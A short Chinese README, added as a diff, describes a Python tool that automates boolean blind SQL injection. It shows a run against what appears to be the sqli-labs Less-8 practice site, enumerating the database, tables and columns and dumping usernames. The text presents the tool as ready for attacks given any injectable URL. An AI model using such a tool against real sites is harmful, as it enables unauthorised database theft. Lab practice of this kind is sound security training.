@@ -1,1 +1,42 @@
+此代码是基于bool型盲注原理写的，
+运行效果如下：
+C:\Users\26928\AppData\Local\Programs\Python\Python38\python.exe D:/pythontest/bool盲注/bool.py
+请输入含有注入点的目标url：http://192.168.6.149/sql-labs/Less-8/?id=1
+请输入网站页面注入成功的信息：You are in
+[-]开始测试注入的闭合方式......
+[+]成功，得到注入的闭合方式:["'"]
 
+[-]开始测试数据库名长度......
+[+]成功，数据库长度为：8
+
+[-]开始测试数据库名.......
+[+]成功，数据库名：security
+
+[-]开始测试security数据库有几张表.......
+[+]成功，security库一共有4张表
+
+[-]开始对security库猜解其所有表名......
+[+]成功，得到security库下的4张表：['emails', 'referers', 'uagents', 'users']
+
+请输入要爆破的表名:users
+[-]开始猜解您所选表的字段数量：.......
+[+]成功，users表有3个字段
+[-]开始猜解您所选表的各字段名......
+[+]成功，users表的字段名如下：
+[+]：id
+[+]：username
+[+]：password
+请选择您要爆破的字段：username
+
+[-]开始对users表的username字段进行爆破......
+[+]成功，users表中的username字段有以下13条数据：
+[+]成功，username字段下有如下数据['dumb', 'angelina', 'dumm~', 'secure', 'stupid', 'superman', 'batman', 'admin', 'admin1', 'admin2', 'admin3', 'dhakkan', 'admin4']
+Running time:66.43 s
+
+Process finished with exit code 0
+
+
+发现速度还是挺快的，使用者只需要准备好含注入点的网址以及该页面的提示信息即可开始攻击
+运行过程中，如果该点没有注入点或页面提示信息不正确的话会会在程序运行过程中进行提示。
+运行中，攻击者可以选择要进行网站下的数据库的那张表名进行爆破
+版本再不断完善更新中，请使用数字大的代码运行.........
